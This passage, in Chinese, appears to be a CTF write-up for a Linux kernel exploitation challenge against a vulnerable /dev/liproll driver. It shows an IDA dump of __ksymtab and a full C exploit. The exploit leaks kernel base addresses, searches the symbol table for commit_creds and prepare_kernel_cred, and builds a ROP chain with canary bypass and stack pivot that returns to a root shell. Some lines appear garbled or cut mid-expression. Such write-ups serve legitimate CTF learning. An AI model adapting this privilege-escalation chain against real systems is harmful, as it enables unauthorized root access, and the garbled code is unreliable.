重点在于，`__ksymtab`这个section，相当于一个`size=0xC`的结构体的数组，前4 bytes表示函数地址的偏移，中间4
bytes表示函数名的偏移，最后4 bytes也是偏移：
        __ksymtab:FFFFFFFF822EE908 __ksymtab       segment dword public 'CONST' use64
    __ksymtab:FFFFFFFF822EE908                 assume cs:__ksymtab
    __ksymtab:FFFFFFFF822EE908                 ;org 0FFFFFFFF822EE908h
    __ksymtab:FFFFFFFF822EE908 ; struct func_struct _ksymtab_array[5944]
    __ksymtab:FFFFFFFF822EE908 __ksymtab_array dd 0FF15CB08h, 207DFh, 314F1h
    __ksymtab:FFFFFFFF822EE908                                         ; DATA XREF: sub_FFFFFFFF81505000+11C↑o
    __ksymtab:FFFFFFFF822EE908                                         ; sub_FFFFFFFF81505000+123↑o ...
    __ksymtab:FFFFFFFF822EE908                 dd 0FF331E4Ch, 29490h, 314E5h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4EC780h, 30040h, 314D9h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4ED4F4h, 30079h, 314CDh
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4ED4C8h, 300A8h, 314C1h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4EBE5Ch, 2FFECh, 314B5h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4EE630h, 30038h, 314A9h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4EC284h, 2FFE8h, 3149Dh
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4EEDA8h, 3005Ah, 31491h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4EBDFCh, 30000h, 31485h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF377750h, 2A291h, 31479h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF2A8794h, 26BC4h, 3146Dh
    __ksymtab:FFFFFFFF822EE908                 dd 0FF2A7538h, 26BB1h, 31461h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF2A751Ch, 26B94h, 31455h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF982850h, 48936h, 31449h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF5000A4h, 30CC7h, 3143Dh
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4D9CF8h, 2F487h, 31431h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4C3EDCh, 2E471h, 31425h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF2CF4C0h, 270CDh, 31419h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF97BA04h, 48682h, 3140Dh
    __ksymtab:FFFFFFFF822EE908                 dd 0FF32DE88h, 2912Bh, 31401h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4AA3DCh, 2D565h, 313F5h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF520h, 2E8E4h, 313E9h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF5E4h, 2E8FEh, 313DDh
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF7E8h, 2E954h, 313D1h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF4CCh, 2E878h, 313C5h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF450h, 2E85Dh, 313B9h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF664h, 2E8EFh, 313ADh
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF548h, 2E8A9h, 313A1h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF60Ch, 2E8C6h, 31395h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF720h, 2E8FFh, 31389h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CFB94h, 2E859h, 3137Dh
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CFA78h, 2E838h, 31371h
    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF68Ch, 2E8BBh, 31365h
比如第一项`dd 0FF331E4Ch, 29490h, 314E5h`，计算出`(0x822EE908 + 0xFF15CB08C) & ((1 > 12) = vmlinux_base + 0x12EE908
              && (unsigned __int64)global_buffer 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define CMD_CREATE 0xD3C7F03
    #define CMD_CHOOSE 0xD3C7F04
    #define CMD_RESET  0xD3C7F02
    #define CMD_CAST   0xD3C7F01
    struct liproll
    {
        void *ptr;
        uint32_t size;
    };
    void die(const char *msg)
    {
        perror(msg);
        exit(-1);
    }
    uint64_t prepare_kernel_cred;
    uint64_t commit_creds;
    uint64_t user_cs, user_ss, user_sp, user_rflags;
    void save_status()
    {
        __asm(
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
        );
        printf("[*] Status saved\n");
    }
    void privilege_escalation()
    {
        void *(*pkc)(void *) = (void *)prepare_kernel_cred;
        void *(*cc)(void *) = (void *)commit_creds;
        (*cc)((*pkc)(0));
    }
    void getshell()
    {
        if(getuid() == 0)
        {
            printf("[!] Root!\n");
            system("/bin/sh");
        }
        else
        {
            printf("[!] Failed!\n");
        }
    }
    void swapgs()
    {
        asm(
            "swapgs;"
            "iretq;"
        );
    }
    void sub_rsp()
    {
        asm(
            "sub rsp, 0x128;"
            "ret;"
        );
    }
    int main(void)
    {
        uint32_t idx = 0;
        char buf[0x200] = {0};
        int fd = open("/dev/liproll", O_RDWR);
        if(fd > 12) << 12) + 0x2000;
        uint64_t _bss_sec = _data_sec + 0x4C0;
        printf("[+] .data section address is: %p\n", _data_sec);
        printf("[+] .bss section address is: %p\n", _bss_sec);
        // leak vmlinux_base
        *(uint64_t *)(buf + 0x100) = _bss_sec + 0x80;
        *(uint32_t *)(buf + 0x108) = 8;
        tmp.ptr = buf;
        tmp.size = 0x110;
        ioctl(fd, CMD_CHOOSE, &idx);
        ioctl(fd, CMD_CAST, &tmp);
        read(fd, buf, 8);
        uint64_t vmlinux_base = *(uint64_t *)buf;
        printf("[+] vmlinux base is: %p\n", vmlinux_base);
        // overwrite vmlinux_base = 0 to bypass liproll_read check
        *(uint64_t *)buf = 0;
        write(fd, buf, 8);
        // find commit_creds and prepare_kernel_cred in __ksymtab
        uint64_t __ksymtab_start = vmlinux_base + 0x12EE908;
        printf("[+] __ksymtab_start address is: %p\n", __ksymtab_start);
        int i, j;
        int found_commit_creds = 0, found_prepare_kernel_cred = 0;
        int found_do_sync_core = 0, found_intel_pmu_save_and_restart = 0;
        for(i = 0; i < 0x12000; i += 0xFC){
            char accept_buf[0x100];
            uint64_t base_addr = __ksymtab_start + i;
            *(uint64_t *)(buf + 0x100) = base_addr;
            *(uint32_t *)(buf + 0x108) = 0xFC;
            ioctl(fd, CMD_CHOOSE, &idx);
            ioctl(fd, CMD_CAST, &tmp);
            read(fd, accept_buf, 0xFC);
            for(j = 0; j < 0xFC; j += 0xC)
            {
                char name_buf[0x100];
                uint32_t func_offset = *(uint32_t *)(accept_buf + j);
                uint32_t name_offset = *(uint32_t *)(accept_buf + j + 4);
                uint64_t func_addr = ((uint32_t)base_addr + func_offset + j) | (0xffffffffull << 32);
                uint64_t name_addr = base_addr + name_offset + j + 4;
                *(uint64_t *)(buf + 0x100) = name_addr;
                *(uint32_t *)(buf + 0x108) = 0x20;
                ioctl(fd, CMD_CHOOSE, &idx);
                ioctl(fd, CMD_CAST, &tmp);
                read(fd, name_buf, 0x20);
                if(memcmp(name_buf, "commit_creds", 0xC) == 0)
                {
                    printf("[+] found commit_creds address is: %p\n", func_addr);
                    found_commit_creds = 1;
                    commit_creds = func_addr;
                }
                else if(memcmp(name_buf, "prepare_kernel_cred", 0x13) == 0)
                {
                    printf("[+] found prepare_kernel_cred address is: %p\n", func_addr);
                    found_prepare_kernel_cred = 1;
                    prepare_kernel_cred = func_addr;
                }
                if(found_prepare_kernel_cred && found_commit_creds)
                    break;
            }
        }
        save_status();
        // rop
        *(uint64_t *)(buf + 0x110) = canary;
        *(uint64_t *)(buf + 0x120) = &sub_rsp + 8; 
        *(uint64_t *)(buf + 0x0) = &privilege_escalation; 
        *(uint64_t *)(buf + 0x8) = &swapgs + 8;
        *(uint64_t *)(buf + 0x10) = &getshell;
        *(uint64_t *)(buf + 0x18) = user_cs;
        *(uint64_t *)(buf + 0x20) = user_rflags;
        *(uint64_t *)(buf + 0x28) = user_sp;
        *(uint64_t *)(buf + 0x30) = user_ss;
        tmp.size = 0x128;
        ioctl(fd, CMD_CHOOSE, &idx);
        ioctl(fd, CMD_CAST, &tmp);
        return 0;
    }
  7. 简单提一下自己踩的坑： 
    * 打印栈上残留的数据的时候，发现实际运行和调试的时候，得到的数据是不一样的，这里卡了很久；后面直接就不挂调试，而是直接dump栈上的数据，然后找有用的地址。
    * 最后写rop的时候，内核栈放不下最后会crash，所以做一个小小的栈迁移；不过既然任何gadgets都可以在用户程序中构造，也很方便。
    * 因为gadget是封装在用户态程序的函数体中的，所以需要跳过函数头才能直接执行到gadget本身，否则会有`push rbp`的执行。